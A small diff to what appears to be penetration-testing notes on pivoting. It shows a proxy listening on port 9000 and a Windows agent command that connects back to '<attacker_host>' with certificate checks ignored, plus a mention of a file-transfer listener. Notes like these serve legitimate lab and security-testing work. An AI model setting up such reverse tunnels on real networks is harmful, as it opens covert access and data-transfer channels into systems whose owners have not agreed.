@@ -13,7 +13,7 @@ sudo ./lin-proxy -selfcert -laddr 0.0.0.0:9000
 Initiating connection from agent to proxy
 
 ```
-.\win-agent.exe -connect 10.10.14.180:9000 -ignore-cert
+.\win-agent.exe -connect <attacker_host>:9000 -ignore-cert
 ```
 
 Adding Listener (for file transfer)
